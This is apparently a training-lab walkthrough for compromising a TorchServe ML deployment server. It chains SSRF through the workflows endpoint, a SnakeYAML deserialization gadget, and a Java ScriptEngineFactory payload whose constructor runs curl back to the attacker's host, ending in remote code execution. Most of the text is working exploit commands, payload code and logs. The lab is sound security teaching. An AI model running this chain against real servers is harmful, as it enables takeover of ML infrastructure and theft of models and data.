# Model Deployment Tampering

Model deployment tampering is when an attacker modifies an AI model after it has been trained and deployed. They may add backdoors, 
change how the model makes decisions, reduce its accuracy, or abuse it to access or manipulate sensitive data. 
Because the model often still appears to work normally, these attacks can be difficult to detect until they cause real problems.

-LAB- 

How to execute the exploit chain to compromise the ML deployment server, leading to remote code execution.


Establish an SSH session using the credentials, and perform remote and local port forwarding, while focusing on a remote port that will be used to obtain the reverse shell.

```
ssh htb-stdnt@154.57.164.71 -p 31581 -R 8000:127.0.0.1:8000 -R 31581:127.0.0.1:31581 -L 8081:127.0.0.1:8081 -N

```

**Unauthorized Remote Access**

Accessing the management API running on port 8081 to confirm that the lab is vulnerable shows the
API responds with an error message, however, successfully confirmed that we can access the management API.

```
curl http://127.0.0.1:8081/
```

Output:

```
{
  "code": 405,
  "type": "MethodNotAllowedException",
  "message": "Requested method is not allowed, please refer to API document."
}
```

**Server-Side Request Forgery (SSRF)**

Confirm the SSRF vulnerability by starting a netcat listener on the port we forwarded to the lab via SSH:

```
nc -lnvp 8000
```

The vulnerable endpoint is the /workflows endpoint, which accepts a remote URL in the URL GET parameter in HTTP POST requests. 
To confirm the SSRF vulnerability as we get a hit on the netcat listener:


One terminal: 
```
curl -X POST http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/ssrf
```

netcat terminal:
```
nc -lnvp 8000
Listening on 0.0.0.0 8000
Connection received on 127.0.0.1 48834
GET /ssrf HTTP/1.1
User-Agent: Java/17.0.16
Host: 127.0.0.1:8000
Accept: text/html, image/gif, image/jpeg, */*; q=0.2
Connection: keep-alive
```

To prepare the deserialization exploit, create a malicious war file that loads additional code 
To create such a malicious archive, create two local files such that TorchServe accepts it.


handler.py 
```
def initialize(self, context):
    self.model = self.load_model()
```

Add a specification file spec.yaml that forces the vulnerable library to load additional Java code from our system.

Reference: https://raw.githubusercontent.com/mbechler/marshalsec/refs/heads/master/marshalsec.pdf

spec.yaml
```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]
```

Create a war archive in the expected format with the Python library torch-workflow-archiver:

```
pip3 install torch-workflow-archiver

torch-workflow-archiver --workflow-name pwn --spec-file spec.yaml --handler handler.py
```

That command creates a file pwn.war containing the malicious spec.yaml and handler.py files.


**Deserialization**

Before achieving remote code execution (RCE), you must create a malicious Java payload and host it on your own machine. 
After the target uploads the malicious pwn.war file, it will download this Java payload from your machine and execute it. 
For the payload to be accepted, it must implement Java's ScriptEngineFactory interface, 
so you start by creating the provided MyScriptEngineFactory.java template.


MyScriptEngineFactory.java

```
package exploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class MyScriptEngineFactory implements ScriptEngineFactory {

    public MyScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://127.0.0.1:8000/rce");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

Complile the payload:

```
javac -source 17 -target 17 MyScriptEngineFactory.java
```

Check for the compiled class:

```
ls *.class
```

Lastly, create a directory structure for the payload to be loaded and executed correctly. 
Create a file javax.script.ScriptEngineFactory that points to our payload. Move our compiled payload MyScriptEngineFactory.class to the expected directory:

```
mkdir -p META-INF/services/

echo 'exploit.MyScriptEngineFactory' > META-INF/services/javax.script.ScriptEngineFactory

mkdir exploit

mv MyScriptEngineFactory.class exploit/

```

**Obtaining Remote Code Execution (RCE)**

Now to trigger the exploit. 1. Start a web server in the directory containing the META-INF and exploit directories as well as the pwn.war file:

```
python3 -m http.server 8000
```

Exploit the SSRF vulnerability with a URL pointing to the malicious war archive:
 
```
curl -X POST http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/pwn.war
```

Going back to our web server access log and seeing the following requests:

```
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [05/Jul/2026 12:41:53] "GET /pwn.war HTTP/1.1" 200 -
127.0.0.1 - - [05/Jul/2026 12:41:53] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
127.0.0.1 - - [05/Jul/2026 12:41:54] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
127.0.0.1 - - [05/Jul/2026 12:41:54] "GET /exploit/MyScriptEngineFactory.class HTTP/1.1" 200 -
127.0.0.1 - - [05/Jul/2026 12:41:55] code 404, message File not found
127.0.0.1 - - [05/Jul/2026 12:41:55] "GET /rce HTTP/1.1" 404 -
```

The SSRF vulnerability caused the server to download the malicious pwn.war file. The deserialization exploit then forced it to load additional Java code (MyScriptEngineFactory.class) from the attacker's server, resulting in remote code execution (RCE). 
This demonstrates how chaining multiple vulnerabilities (SSRF → deserialization → RCE) can completely compromise an AI application's deployment infrastructure, putting the model, data, and entire ML pipeline at risk.

**LAB QUESTION**
XXXXXX





